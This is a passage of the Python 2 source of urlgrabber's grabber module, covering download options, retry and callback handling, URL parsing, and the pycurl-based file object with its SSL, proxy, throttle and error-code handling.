    control, you should probably subclass URLParser and pass it in via
    the 'urlparser' option.

  ssl_ca_cert = None

    this option can be used if M2Crypto is available and will be
    ignored otherwise.  If provided, it will be used to create an SSL
    context.  If both ssl_ca_cert and ssl_context are provided, then
    ssl_context will be ignored and a new context will be created from
    ssl_ca_cert.

  ssl_context = None

    No-op when using the curl backend (default)
   

  self.ssl_verify_peer = True 

    Check the server's certificate to make sure it is valid with what our CA validates
  
  self.ssl_verify_host = True

    Check the server's hostname to make sure it matches the certificate DN

  self.ssl_key = None

    Path to the key the client should use to connect/authenticate with

  self.ssl_key_type = 'PEM' 

    PEM or DER - format of key
     
  self.ssl_cert = None

    Path to the ssl certificate the client should use to to authenticate with

  self.ssl_cert_type = 'PEM' 

    PEM or DER - format of certificate
    
  self.ssl_key_pass = None 

    password to access the ssl_key
    
  self.size = None

    size (in bytes) or Maximum size of the thing being downloaded. 
    This is mostly to keep us from exploding with an endless datastream
  
  self.max_header_size = 2097152 

    Maximum size (in bytes) of the headers.
    

RETRY RELATED ARGUMENTS

  retry = None

    the number of times to retry the grab before bailing.  If this is
    zero, it will retry forever. This was intentional... really, it
    was :). If this value is not supplied or is supplied but is None
    retrying does not occur.

  retrycodes = [-1,2,4,5,6,7]

    a sequence of errorcodes (values of e.errno) for which it should
    retry. See the doc on URLGrabError for more details on this.  You
    might consider modifying a copy of the default codes rather than
    building yours from scratch so that if the list is extended in the
    future (or one code is split into two) you can still enjoy the
    benefits of the default list.  You can do that with something like
    this:

      retrycodes = urlgrabber.grabber.URLGrabberOptions().retrycodes
      if 12 not in retrycodes:
          retrycodes.append(12)
      
  checkfunc = None

    a function to do additional checks. This defaults to None, which
    means no additional checking.  The function should simply return
    on a successful check.  It should raise URLGrabError on an
    unsuccessful check.  Raising of any other exception will be
    considered immediate failure and no retries will occur.

    If it raises URLGrabError, the error code will determine the retry
    behavior.  Negative error numbers are reserved for use by these
    passed in functions, so you can use many negative numbers for
    different types of failure.  By default, -1 results in a retry,
    but this can be customized with retrycodes.

    If you simply pass in a function, it will be given exactly one
    argument: a CallbackObject instance with the .url attribute
    defined and either .filename (for urlgrab) or .data (for urlread).
    For urlgrab, .filename is the name of the local file.  For
    urlread, .data is the actual string data.  If you need other
    arguments passed to the callback (program state of some sort), you
    can do so like this:

      checkfunc=(function, ('arg1', 2), {'kwarg': 3})

    if the downloaded file has filename /tmp/stuff, then this will
    result in this call (for urlgrab):

      function(obj, 'arg1', 2, kwarg=3)
      # obj.filename = '/tmp/stuff'
      # obj.url = 'http://foo.com/stuff'
      
    NOTE: both the "args" tuple and "kwargs" dict must be present if
    you use this syntax, but either (or both) can be empty.

  failure_callback = None

    The callback that gets called during retries when an attempt to
    fetch a file fails.  The syntax for specifying the callback is
    identical to checkfunc, except for the attributes defined in the
    CallbackObject instance.  The attributes for failure_callback are:

      exception = the raised exception
      url       = the url we're trying to fetch
      tries     = the number of tries so far (including this one)
      retry     = the value of the retry option

    The callback is present primarily to inform the calling program of
    the failure, but if it raises an exception (including the one it's
    passed) that exception will NOT be caught and will therefore cause
    future retries to be aborted.

    The callback is called for EVERY failure, including the last one.
    On the last try, the callback can raise an alternate exception,
    but it cannot (without severe trickiness) prevent the exception
    from being raised.

  interrupt_callback = None

    This callback is called if KeyboardInterrupt is received at any
    point in the transfer.  Basically, this callback can have three
    impacts on the fetch process based on the way it exits:

      1) raise no exception: the current fetch will be aborted, but
         any further retries will still take place

      2) raise a URLGrabError: if you're using a MirrorGroup, then
         this will prompt a failover to the next mirror according to
         the behavior of the MirrorGroup subclass.  It is recommended
         that you raise URLGrabError with code 15, 'user abort'.  If
         you are NOT using a MirrorGroup subclass, then this is the
         same as (3).

      3) raise some other exception (such as KeyboardInterrupt), which
         will not be caught at either the grabber or mirror levels.
         That is, it will be raised up all the way to the caller.

    This callback is very similar to failure_callback.  They are
    passed the same arguments, so you could use the same function for
    both.
      
BANDWIDTH THROTTLING

  urlgrabber supports throttling via two values: throttle and
  bandwidth Between the two, you can either specify and absolute
  throttle threshold or specify a theshold as a fraction of maximum
  available bandwidth.

  throttle is a number - if it's an int, it's the bytes/second
  throttle limit.  If it's a float, it is first multiplied by
  bandwidth.  If throttle == 0, throttling is disabled.  If None, the
  module-level default (which can be set with set_throttle) is used.

  bandwidth is the nominal max bandwidth in bytes/second.  If throttle
  is a float and bandwidth == 0, throttling is disabled.  If None, the
  module-level default (which can be set with set_bandwidth) is used.

  THROTTLING EXAMPLES:

  Lets say you have a 100 Mbps connection.  This is (about) 10^8 bits
  per second, or 12,500,000 Bytes per second.  You have a number of
  throttling options:

  *) set_bandwidth(12500000); set_throttle(0.5) # throttle is a float

     This will limit urlgrab to use half of your available bandwidth.

  *) set_throttle(6250000) # throttle is an int

     This will also limit urlgrab to use half of your available
     bandwidth, regardless of what bandwidth is set to.

  *) set_throttle(6250000); set_throttle(1.0) # float

     Use half your bandwidth

  *) set_throttle(6250000); set_throttle(2.0) # float

    Use up to 12,500,000 Bytes per second (your nominal max bandwidth)

  *) set_throttle(6250000); set_throttle(0) # throttle = 0

     Disable throttling - this is more efficient than a very large
     throttle setting.

  *) set_throttle(0); set_throttle(1.0) # throttle is float, bandwidth = 0

     Disable throttling - this is the default when the module is loaded.

  SUGGESTED AUTHOR IMPLEMENTATION (THROTTLING)

  While this is flexible, it's not extremely obvious to the user.  I
  suggest you implement a float throttle as a percent to make the
  distinction between absolute and relative throttling very explicit.

  Also, you may want to convert the units to something more convenient
  than bytes/second, such as kbps or kB/s, etc.

"""



import os
import sys
import urlparse
import time
import string
import urllib
import urllib2
import mimetools
import thread
import types
import stat
import pycurl
from ftplib import parse150
from StringIO import StringIO
from httplib import HTTPException
import socket
from byterange import range_tuple_normalize, range_tuple_to_header, RangeError

########################################################################
#                     MODULE INITIALIZATION
########################################################################
try:
    exec('from ' + (__name__.split('.'))[0] + ' import __version__')
except:
    __version__ = '???'

########################################################################
# functions for debugging output.  These functions are here because they
# are also part of the module initialization.
DEBUG = None
def set_logger(DBOBJ):
    """Set the DEBUG object.  This is called by _init_default_logger when
    the environment variable URLGRABBER_DEBUG is set, but can also be
    called by a calling program.  Basically, if the calling program uses
    the logging module and would like to incorporate urlgrabber logging,
    then it can do so this way.  It's probably not necessary as most
    internal logging is only for debugging purposes.

    The passed-in object should be a logging.Logger instance.  It will
    be pushed into the keepalive and byterange modules if they're
    being used.  The mirror module pulls this object in on import, so
    you will need to manually push into it.  In fact, you may find it
    tidier to simply push your logging object (or objects) into each
    of these modules independently.
    """

    global DEBUG
    DEBUG = DBOBJ

def _init_default_logger(logspec=None):
    '''Examines the environment variable URLGRABBER_DEBUG and creates
    a logging object (logging.logger) based on the contents.  It takes
    the form

      URLGRABBER_DEBUG=level,filename
      
    where "level" can be either an integer or a log level from the
    logging module (DEBUG, INFO, etc).  If the integer is zero or
    less, logging will be disabled.  Filename is the filename where
    logs will be sent.  If it is "-", then stdout will be used.  If
    the filename is empty or missing, stderr will be used.  If the
    variable cannot be processed or the logging module cannot be
    imported (python < 2.3) then logging will be disabled.  Here are
    some examples:

      URLGRABBER_DEBUG=1,debug.txt   # log everything to debug.txt
      URLGRABBER_DEBUG=WARNING,-     # log warning and higher to stdout
      URLGRABBER_DEBUG=INFO          # log info and higher to stderr
      
    This funtion is called during module initialization.  It is not
    intended to be called from outside.  The only reason it is a
    function at all is to keep the module-level namespace tidy and to
    collect the code into a nice block.'''

    try:
        if logspec is None:
            logspec = os.environ['URLGRABBER_DEBUG']
        dbinfo = logspec.split(',')
        import logging
        level = logging._levelNames.get(dbinfo[0], None)
        if level is None: level = int(dbinfo[0])
        if level < 1: raise ValueError()

        formatter = logging.Formatter('%(asctime)s %(message)s')
        if len(dbinfo) > 1: filename = dbinfo[1]
        else: filename = ''
        if filename == '': handler = logging.StreamHandler(sys.stderr)
        elif filename == '-': handler = logging.StreamHandler(sys.stdout)
        else:  handler = logging.FileHandler(filename)
        handler.setFormatter(formatter)
        DBOBJ = logging.getLogger('urlgrabber')
        DBOBJ.addHandler(handler)
        DBOBJ.setLevel(level)
    except (KeyError, ImportError, ValueError):
        DBOBJ = None
    set_logger(DBOBJ)

def _log_package_state():
    if not DEBUG: return
    DEBUG.info('urlgrabber version  = %s' % __version__)
    DEBUG.info('trans function "_"  = %s' % _)
        
_init_default_logger()
_log_package_state()


# normally this would be from i18n or something like it ...
def _(st):
    return st

########################################################################
#                 END MODULE INITIALIZATION
########################################################################



class URLGrabError(IOError):
    """
    URLGrabError error codes:

      URLGrabber error codes (0 -- 255)
        0    - everything looks good (you should never see this)
        1    - malformed url
        2    - local file doesn't exist
        3    - request for non-file local file (dir, etc)
        4    - IOError on fetch
        5    - OSError on fetch
        6    - no content length header when we expected one
        7    - HTTPException
        8    - Exceeded read limit (for urlread)
        9    - Requested byte range not satisfiable.
        10   - Byte range requested, but range support unavailable
        11   - Illegal reget mode
        12   - Socket timeout
        13   - malformed proxy url
        14   - HTTPError (includes .code and .exception attributes)
        15   - user abort
        16   - error writing to local file
        
      MirrorGroup error codes (256 -- 511)
        256  - No more mirrors left to try

      Custom (non-builtin) classes derived from MirrorGroup (512 -- 767)
        [ this range reserved for application-specific error codes ]

      Retry codes (< 0)
        -1   - retry the download, unknown reason

    Note: to test which group a code is in, you can simply do integer
    division by 256: e.errno / 256

    Negative codes are reserved for use by functions passed in to
    retrygrab with checkfunc.  The value -1 is built in as a generic
    retry code and is already included in the retrycodes list.
    Therefore, you can create a custom check function that simply
    returns -1 and the fetch will be re-tried.  For more customized
    retries, you can use other negative number and include them in
    retry-codes.  This is nice for outputting useful messages about
    what failed.

    You can use these error codes like so:
      try: urlgrab(url)
      except URLGrabError, e:
         if e.errno == 3: ...
           # or
         print e.strerror
           # or simply
         print e  #### print '[Errno %i] %s' % (e.errno, e.strerror)
    """
    def __init__(self, *args):
        IOError.__init__(self, *args)
        self.url = "No url specified"

class CallbackObject:
    """Container for returned callback data.

    This is currently a dummy class into which urlgrabber can stuff
    information for passing to callbacks.  This way, the prototype for
    all callbacks is the same, regardless of the data that will be
    passed back.  Any function that accepts a callback function as an
    argument SHOULD document what it will define in this object.

    It is possible that this class will have some greater
    functionality in the future.
    """
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)

def urlgrab(url, filename=None, **kwargs):
    """grab the file at <url> and make a local copy at <filename>
    If filename is none, the basename of the url is used.
    urlgrab returns the filename of the local file, which may be different
    from the passed-in filename if the copy_local kwarg == 0.
    
    See module documentation for a description of possible kwargs.
    """
    return default_grabber.urlgrab(url, filename, **kwargs)

def urlopen(url, **kwargs):
    """open the url and return a file object
    If a progress object or throttle specifications exist, then
    a special file object will be returned that supports them.
    The file object can be treated like any other file object.
    
    See module documentation for a description of possible kwargs.
    """
    return default_grabber.urlopen(url, **kwargs)

def urlread(url, limit=None, **kwargs):
    """read the url into a string, up to 'limit' bytes
    If the limit is exceeded, an exception will be thrown.  Note that urlread
    is NOT intended to be used as a way of saying "I want the first N bytes"
    but rather 'read the whole file into memory, but don't use too much'
    
    See module documentation for a description of possible kwargs.
    """
    return default_grabber.urlread(url, limit, **kwargs)


class URLParser:
    """Process the URLs before passing them to urllib2.

    This class does several things:

      * add any prefix
      * translate a "raw" file to a proper file: url
      * handle any http or https auth that's encoded within the url
      * quote the url

    Only the "parse" method is called directly, and it calls sub-methods.

    An instance of this class is held in the options object, which
    means that it's easy to change the behavior by sub-classing and
    passing the replacement in.  It need only have a method like:

        url, parts = urlparser.parse(url, opts)
    """

    def parse(self, url, opts):
        """parse the url and return the (modified) url and its parts

        Note: a raw file WILL be quoted when it's converted to a URL.
        However, other urls (ones which come with a proper scheme) may
        or may not be quoted according to opts.quote

          opts.quote = 1     --> quote it
          opts.quote = 0     --> do not quote it
          opts.quote = None  --> guess
        """
        quote = opts.quote
        
        if opts.prefix:
            url = self.add_prefix(url, opts.prefix)
            
        parts = urlparse.urlparse(url)
        (scheme, host, path, parm, query, frag) = parts

        if not scheme or (len(scheme) == 1 and scheme in string.letters):
            # if a scheme isn't specified, we guess that it's "file:"
            if url[0] not in '/\\': url = os.path.abspath(url)
            url = 'file:' + urllib.pathname2url(url)
            parts = urlparse.urlparse(url)
            quote = 0 # pathname2url quotes, so we won't do it again
            
        if scheme in ['http', 'https']:
            parts = self.process_http(parts, url)
            
        if quote is None:
            quote = self.guess_should_quote(parts)
        if quote:
            parts = self.quote(parts)
        
        url = urlparse.urlunparse(parts)
        return url, parts

    def add_prefix(self, url, prefix):
        if prefix[-1] == '/' or url[0] == '/':
            url = prefix + url
        else:
            url = prefix + '/' + url
        return url

    def process_http(self, parts, url):
        (scheme, host, path, parm, query, frag) = parts
        # TODO: auth-parsing here, maybe? pycurl doesn't really need it
        return (scheme, host, path, parm, query, frag)

    def quote(self, parts):
        """quote the URL

        This method quotes ONLY the path part.  If you need to quote
        other parts, you should override this and pass in your derived
        class.  The other alternative is to quote other parts before
        passing into urlgrabber.
        """
        (scheme, host, path, parm, query, frag) = parts
        path = urllib.quote(path)
        return (scheme, host, path, parm, query, frag)

    hexvals = '0123456789ABCDEF'
    def guess_should_quote(self, parts):
        """
        Guess whether we should quote a path.  This amounts to
        guessing whether it's already quoted.

        find ' '   ->  1
        find '%'   ->  1
        find '%XX' ->  0
        else       ->  1
        """
        (scheme, host, path, parm, query, frag) = parts
        if ' ' in path:
            return 1
        ind = string.find(path, '%')
        if ind > -1:
            while ind > -1:
                if len(path) < ind+3:
                    return 1
                code = path[ind+1:ind+3].upper()
                if     code[0] not in self.hexvals or \
                       code[1] not in self.hexvals:
                    return 1
                ind = string.find(path, '%', ind+1)
            return 0
        return 1
    
class URLGrabberOptions:
    """Class to ease kwargs handling."""

    def __init__(self, delegate=None, **kwargs):
        """Initialize URLGrabberOptions object.
        Set default values for all options and then update options specified
        in kwargs.
        """
        self.delegate = delegate
        if delegate is None:
            self._set_defaults()
        self._set_attributes(**kwargs)
    
    def __getattr__(self, name):
        if self.delegate and hasattr(self.delegate, name):
            return getattr(self.delegate, name)
        raise AttributeError, name
    
    def raw_throttle(self):
        """Calculate raw throttle value from throttle and bandwidth 
        values.
        """
        if self.throttle <= 0:  
            return 0
        elif type(self.throttle) == type(0): 
            return float(self.throttle)
        else: # throttle is a float
            return self.bandwidth * self.throttle
        
    def derive(self, **kwargs):
        """Create a derived URLGrabberOptions instance.
        This method creates a new instance and overrides the
        options specified in kwargs.
        """
        return URLGrabberOptions(delegate=self, **kwargs)
        
    def _set_attributes(self, **kwargs):
        """Update object attributes with those provided in kwargs."""
        self.__dict__.update(kwargs)
        if kwargs.has_key('range'):
            # normalize the supplied range value
            self.range = range_tuple_normalize(self.range)
        if not self.reget in [None, 'simple', 'check_timestamp']:
            raise URLGrabError(11, _('Illegal reget mode: %s') \
                               % (self.reget, ))

    def _set_defaults(self):
        """Set all options to their default values. 
        When adding new options, make sure a default is
        provided here.
        """
        self.progress_obj = None
        self.throttle = 1.0
        self.bandwidth = 0
        self.retry = None
        self.retrycodes = [-1,2,4,5,6,7]
        self.checkfunc = None
        self.copy_local = 0
        self.close_connection = 0
        self.range = None
        self.user_agent = 'urlgrabber/%s' % __version__
        self.keepalive = 1
        self.proxies = None
        self.reget = None
        self.failure_callback = None
        self.interrupt_callback = None
        self.prefix = None
        self.opener = None
        self.cache_openers = True
        self.timeout = None
        self.text = None
        self.http_headers = None
        self.ftp_headers = None
        self.data = None
        self.urlparser = URLParser()
        self.quote = None
        self.ssl_ca_cert = None # sets SSL_CAINFO - path to certdb
        self.ssl_context = None # no-op in pycurl
        self.ssl_verify_peer = True # check peer's cert for authenticityb
        self.ssl_verify_host = True # make sure who they are and who the cert is for matches
        self.ssl_key = None # client key
        self.ssl_key_type = 'PEM' #(or DER)
        self.ssl_cert = None # client cert
        self.ssl_cert_type = 'PEM' # (or DER)
        self.ssl_key_pass = None # password to access the key
        self.size = None # if we know how big the thing we're getting is going
                         # to be. this is ultimately a MAXIMUM size for the file
        self.max_header_size = 2097152 #2mb seems reasonable for maximum header size
        
    def __repr__(self):
        return self.format()
        
    def format(self, indent='  '):
        keys = self.__dict__.keys()
        if self.delegate is not None:
            keys.remove('delegate')
        keys.sort()
        s = '{\n'
        for k in keys:
            s = s + indent + '%-15s: %s,\n' % \
                (repr(k), repr(self.__dict__[k]))
        if self.delegate:
            df = self.delegate.format(indent + '  ')
            s = s + indent + '%-15s: %s\n' % ("'delegate'", df)
        s = s + indent + '}'
        return s

class URLGrabber:
    """Provides easy opening of URLs with a variety of options.
    
    All options are specified as kwargs. Options may be specified when
    the class is created and may be overridden on a per request basis.
    
    New objects inherit default values from default_grabber.
    """
    
    def __init__(self, **kwargs):
        self.opts = URLGrabberOptions(**kwargs)
    
    def _retry(self, opts, func, *args):
        tries = 0
        while 1:
            # there are only two ways out of this loop.  The second has
            # several "sub-ways"
            #   1) via the return in the "try" block
            #   2) by some exception being raised
            #      a) an excepton is raised that we don't "except"
            #      b) a callback raises ANY exception
            #      c) we're not retry-ing or have run out of retries
            #      d) the URLGrabError code is not in retrycodes
            # beware of infinite loops :)
            tries = tries + 1
            exception = None
            retrycode = None
            callback  = None
            if DEBUG: DEBUG.info('attempt %i/%s: %s',
                                 tries, opts.retry, args[0])
            try:
                r = apply(func, (opts,) + args, {})
                if DEBUG: DEBUG.info('success')
                return r
            except URLGrabError, e:
                exception = e
                callback = opts.failure_callback
                retrycode = e.errno
            except KeyboardInterrupt, e:
                exception = e
                callback = opts.interrupt_callback

            if DEBUG: DEBUG.info('exception: %s', exception)
            if callback:
                if DEBUG: DEBUG.info('calling callback: %s', callback)
                cb_func, cb_args, cb_kwargs = self._make_callback(callback)
                obj = CallbackObject(exception=exception, url=args[0],
                                     tries=tries, retry=opts.retry)
                cb_func(obj, *cb_args, **cb_kwargs)

            if (opts.retry is None) or (tries == opts.retry):
                if DEBUG: DEBUG.info('retries exceeded, re-raising')
                raise

            if (retrycode is not None) and (retrycode not in opts.retrycodes):
                if DEBUG: DEBUG.info('retrycode (%i) not in list %s, re-raising',
                                     retrycode, opts.retrycodes)
                raise
    
    def urlopen(self, url, **kwargs):
        """open the url and return a file object
        If a progress object or throttle value specified when this 
        object was created, then  a special file object will be 
        returned that supports them. The file object can be treated 
        like any other file object.
        """
        opts = self.opts.derive(**kwargs)
        if DEBUG: DEBUG.debug('combined options: %s' % repr(opts))
        (url,parts) = opts.urlparser.parse(url, opts) 
        def retryfunc(opts, url):
            return PyCurlFileObject(url, filename=None, opts=opts)
        return self._retry(opts, retryfunc, url)
    
    def urlgrab(self, url, filename=None, **kwargs):
        """grab the file at <url> and make a local copy at <filename>
        If filename is none, the basename of the url is used.
        urlgrab returns the filename of the local file, which may be 
        different from the passed-in filename if copy_local == 0.
        """
        opts = self.opts.derive(**kwargs)
        if DEBUG: DEBUG.debug('combined options: %s' % repr(opts))
        (url,parts) = opts.urlparser.parse(url, opts) 
        (scheme, host, path, parm, query, frag) = parts
        if filename is None:
            filename = os.path.basename( urllib.unquote(path) )
        if scheme == 'file' and not opts.copy_local:
            # just return the name of the local file - don't make a 
            # copy currently
            path = urllib.url2pathname(path)
            if host:
                path = os.path.normpath('//' + host + path)
            if not os.path.exists(path):
                err = URLGrabError(2, 
                      _('Local file does not exist: %s') % (path, ))
                err.url = url
                raise err
            elif not os.path.isfile(path):
                err = URLGrabError(3, 
                                 _('Not a normal file: %s') % (path, ))
                err.url = url
                raise err

            elif not opts.range:
                if not opts.checkfunc is None:
                    cb_func, cb_args, cb_kwargs = \
                       self._make_callback(opts.checkfunc)
                    obj = CallbackObject()
                    obj.filename = path
                    obj.url = url
                    apply(cb_func, (obj, )+cb_args, cb_kwargs)        
                return path
        
        def retryfunc(opts, url, filename):
            fo = PyCurlFileObject(url, filename, opts)
            try:
                fo._do_grab()
                if not opts.checkfunc is None:
                    cb_func, cb_args, cb_kwargs = \
                             self._make_callback(opts.checkfunc)
                    obj = CallbackObject()
                    obj.filename = filename
                    obj.url = url
                    apply(cb_func, (obj, )+cb_args, cb_kwargs)
            finally:
                fo.close()
            return filename
        
        return self._retry(opts, retryfunc, url, filename)
    
    def urlread(self, url, limit=None, **kwargs):
        """read the url into a string, up to 'limit' bytes
        If the limit is exceeded, an exception will be thrown.  Note
        that urlread is NOT intended to be used as a way of saying 
        "I want the first N bytes" but rather 'read the whole file 
        into memory, but don't use too much'
        """
        opts = self.opts.derive(**kwargs)
        if DEBUG: DEBUG.debug('combined options: %s' % repr(opts))
        (url,parts) = opts.urlparser.parse(url, opts) 
        if limit is not None:
            limit = limit + 1
            
        def retryfunc(opts, url, limit):
            fo = PyCurlFileObject(url, filename=None, opts=opts)
            s = ''
            try:
                # this is an unfortunate thing.  Some file-like objects
                # have a default "limit" of None, while the built-in (real)
                # file objects have -1.  They each break the other, so for
                # now, we just force the default if necessary.
                if limit is None: s = fo.read()
                else: s = fo.read(limit)

                if not opts.checkfunc is None:
                    cb_func, cb_args, cb_kwargs = \
                             self._make_callback(opts.checkfunc)
                    obj = CallbackObject()
                    obj.data = s
                    obj.url = url
                    apply(cb_func, (obj, )+cb_args, cb_kwargs)
            finally:
                fo.close()
            return s
            
        s = self._retry(opts, retryfunc, url, limit)
        if limit and len(s) > limit:
            err = URLGrabError(8, 
                               _('Exceeded limit (%i): %s') % (limit, url))
            err.url = url
            raise err

        return s
        
    def _make_callback(self, callback_obj):
        if callable(callback_obj):
            return callback_obj, (), {}
        else:
            return callback_obj

# create the default URLGrabber used by urlXXX functions.
# NOTE: actual defaults are set in URLGrabberOptions
default_grabber = URLGrabber()


class PyCurlFileObject():
    def __init__(self, url, filename, opts):
        self.fo = None
        self._hdr_dump = ''
        self._parsed_hdr = None
        self.url = url
        self.scheme = urlparse.urlsplit(self.url)[0]
        self.filename = filename
        self.append = False
        self.reget_time = None
        self.opts = opts
        if self.opts.reget == 'check_timestamp':
            raise NotImplementedError, "check_timestamp regets are not implemented in this ver of urlgrabber. Please report this."
        self._complete = False
        self._rbuf = ''
        self._rbufsize = 1024*8
        self._ttime = time.time()
        self._tsize = 0
        self._amount_read = 0
        self._reget_length = 0
        self._prog_running = False
        self._error = (None, None)
        self.size = None
        self._do_open()
        
        
    def __getattr__(self, name):
        """This effectively allows us to wrap at the instance level.
        Any attribute not found in _this_ object will be searched for
        in self.fo.  This includes methods."""

        if hasattr(self.fo, name):
            return getattr(self.fo, name)
        raise AttributeError, name

    def _retrieve(self, buf):
        try:
            if not self._prog_running:
                if self.opts.progress_obj:
                    size  = self.size + self._reget_length
                    self.opts.progress_obj.start(self._prog_reportname, 
                                                 urllib.unquote(self.url), 
                                                 self._prog_basename, 
                                                 size=size,
                                                 text=self.opts.text)
                    self._prog_running = True
                    self.opts.progress_obj.update(self._amount_read)

            self._amount_read += len(buf)
            self.fo.write(buf)
            return len(buf)
        except KeyboardInterrupt:
            return -1
            
    def _hdr_retrieve(self, buf):
        if self._over_max_size(cur=len(self._hdr_dump), 
                               max_size=self.opts.max_header_size):
            return -1            
        try:
            self._hdr_dump += buf
            # we have to get the size before we do the progress obj start
            # but we can't do that w/o making it do 2 connects, which sucks
            # so we cheat and stuff it in here in the hdr_retrieve
            if self.scheme in ['http','https'] and buf.lower().find('content-length') != -1:
                length = buf.split(':')[1]
                self.size = int(length)
            elif self.scheme in ['ftp']:
                s = None
                if buf.startswith('213 '):
                    s = buf[3:].strip()
                elif buf.startswith('150 '):
                    s = parse150(buf)
                if s:
                    self.size = int(s)
            
            return len(buf)
        except KeyboardInterrupt:
            return pycurl.READFUNC_ABORT

    def _return_hdr_obj(self):
        if self._parsed_hdr:
            return self._parsed_hdr
        statusend = self._hdr_dump.find('\n')
        hdrfp = StringIO()
        hdrfp.write(self._hdr_dump[statusend:])
        self._parsed_hdr =  mimetools.Message(hdrfp)
        return self._parsed_hdr
    
    hdr = property(_return_hdr_obj)
    http_code = property(fget=
                 lambda self: self.curl_obj.getinfo(pycurl.RESPONSE_CODE))

    def _set_opts(self, opts={}):
        # XXX
        if not opts:
            opts = self.opts


        # defaults we're always going to set
        self.curl_obj.setopt(pycurl.NOPROGRESS, False)
        self.curl_obj.setopt(pycurl.NOSIGNAL, True)
        self.curl_obj.setopt(pycurl.WRITEFUNCTION, self._retrieve)
        self.curl_obj.setopt(pycurl.HEADERFUNCTION, self._hdr_retrieve)
        self.curl_obj.setopt(pycurl.PROGRESSFUNCTION, self._progress_update)
        self.curl_obj.setopt(pycurl.FAILONERROR, True)
        self.curl_obj.setopt(pycurl.OPT_FILETIME, True)
        
        if DEBUG:
            self.curl_obj.setopt(pycurl.VERBOSE, True)
        if opts.user_agent:
            self.curl_obj.setopt(pycurl.USERAGENT, opts.user_agent)
        
        # maybe to be options later
        self.curl_obj.setopt(pycurl.FOLLOWLOCATION, True)
        self.curl_obj.setopt(pycurl.MAXREDIRS, 5)
        
        # timeouts
        timeout = 300
        if opts.timeout:
            timeout = int(opts.timeout)
            self.curl_obj.setopt(pycurl.CONNECTTIMEOUT, timeout)

        # ssl options
        if self.scheme == 'https':
            if opts.ssl_ca_cert: # this may do ZERO with nss  according to curl docs
                self.curl_obj.setopt(pycurl.CAPATH, opts.ssl_ca_cert)
                self.curl_obj.setopt(pycurl.CAINFO, opts.ssl_ca_cert)
            self.curl_obj.setopt(pycurl.SSL_VERIFYPEER, opts.ssl_verify_peer)
            self.curl_obj.setopt(pycurl.SSL_VERIFYHOST, opts.ssl_verify_host)
            if opts.ssl_key:
                self.curl_obj.setopt(pycurl.SSLKEY, opts.ssl_key)
            if opts.ssl_key_type:
                self.curl_obj.setopt(pycurl.SSLKEYTYPE, opts.ssl_key_type)
            if opts.ssl_cert:
                self.curl_obj.setopt(pycurl.SSLCERT, opts.ssl_cert)
            if opts.ssl_cert_type:                
                self.curl_obj.setopt(pycurl.SSLCERTTYPE, opts.ssl_cert_type)
            if opts.ssl_key_pass:
                self.curl_obj.setopt(pycurl.SSLKEYPASSWD, opts.ssl_key_pass)

        #headers:
        if opts.http_headers and self.scheme in ('http', 'https'):
            headers = []
            for (tag, content) in opts.http_headers:
                headers.append('%s:%s' % (tag, content))
            self.curl_obj.setopt(pycurl.HTTPHEADER, headers)

        # ranges:
        if opts.range or opts.reget:
            range_str = self._build_range()
            if range_str:
                self.curl_obj.setopt(pycurl.RANGE, range_str)
            
        # throttle/bandwidth
        if hasattr(opts, 'raw_throttle') and opts.raw_throttle():
            self.curl_obj.setopt(pycurl.MAX_RECV_SPEED_LARGE, int(opts.raw_throttle()))
            
        # proxy settings
        if opts.proxies:
            for (scheme, proxy) in opts.proxies.items():
                if self.scheme in ('ftp'): # only set the ftp proxy for ftp items
                    if scheme not in ('ftp'):
                        continue
                    else:
                        if proxy == '_none_': proxy = ""
                        self.curl_obj.setopt(pycurl.PROXY, proxy)
                elif self.scheme in ('http', 'https'):
                    if scheme not in ('http', 'https'):
                        continue
                    else:
                        if proxy == '_none_': proxy = ""
                        self.curl_obj.setopt(pycurl.PROXY, proxy)
            
        # FIXME username/password/auth settings

        #posts - simple - expects the fields as they are
        if opts.data:
            self.curl_obj.setopt(pycurl.POST, True)
            self.curl_obj.setopt(pycurl.POSTFIELDS, self._to_utf8(opts.data))
            
        # our url
        self.curl_obj.setopt(pycurl.URL, self.url)
        
    
    def _do_perform(self):
        if self._complete:
            return
        
        try:
            self.curl_obj.perform()
        except pycurl.error, e:
            # XXX - break some of these out a bit more clearly
            # to other URLGrabErrors from 
            # http://curl.haxx.se/libcurl/c/libcurl-errors.html
            # this covers e.args[0] == 22 pretty well - which will be common
            
            code = self.http_code
            errcode = e.args[0]
            if self._error[0]:
                errcode = self._error[0]
                
            if errcode == 23 and code >= 200 and code < 299:
                err = URLGrabError(15, _('User (or something) called abort %s: %s') % (self.url, e))
                err.url = self.url
                
                # this is probably wrong but ultimately this is what happens
                # we have a legit http code and a pycurl 'writer failed' code
                # which almost always means something aborted it from outside
                # since we cannot know what it is -I'm banking on it being
                # a ctrl-c. XXXX - if there's a way of going back two raises to 
                # figure out what aborted the pycurl process FIXME
                raise KeyboardInterrupt
            
            elif errcode == 28:
                err = URLGrabError(12, _('Timeout on %s: %s') % (self.url, e))
                err.url = self.url
                raise err
            elif errcode == 35:
                msg = _("problem making ssl connection")
                err = URLGrabError(14, msg)
                err.url = self.url
                raise err
            elif errcode == 37:
                msg = _("Could not open/read %s") % (self.url)
                err = URLGrabError(14, msg)
                err.url = self.url
                raise err
                
            elif errcode == 42:
                err = URLGrabError(15, _('User (or something) called abort %s: %s') % (self.url, e))
                err.url = self.url
                # this is probably wrong but ultimately this is what happens
                # we have a legit http code and a pycurl 'writer failed' code
                # which almost always means something aborted it from outside
                # since we cannot know what it is -I'm banking on it being
                # a ctrl-c. XXXX - if there's a way of going back two raises to 
                # figure out what aborted the pycurl process FIXME
                raise KeyboardInterrupt
                
            elif errcode == 58:
                msg = _("problem with the local client certificate")
                err = URLGrabError(14, msg)
                err.url = self.url
                raise err

            elif errcode == 60:
                msg = _("client cert cannot be verified or client cert incorrect")
                err = URLGrabError(14, msg)
                err.url = self.url
                raise err
            
            elif errcode == 63:
                if self._error[1]:
                    msg = self._error[1]
                else:
                    msg = _("Max download size exceeded on %s") % (self.url)
                err = URLGrabError(14, msg)
                err.url = self.url
                raise err
                    
            elif str(e.args[1]) == '' and self.http_code != 0: # fake it until you make it
                msg = 'HTTP Error %s : %s ' % (self.http_code, self.url)
            else:
                msg = 'PYCURL ERROR %s - "%s"' % (errcode, str(e.args[1]))
                code = errcode
            err = URLGrabError(14, msg)
            err.code = code
            err.exception = e
            raise err

    def _do_open(self):
        self.curl_obj = _curl_cache
        self.curl_obj.reset() # reset all old settings away, just in case
        # setup any ranges
        self._set_opts()
        self._do_grab()
        return self.fo

    def _add_headers(self):
        pass
        
    def _build_range(self):
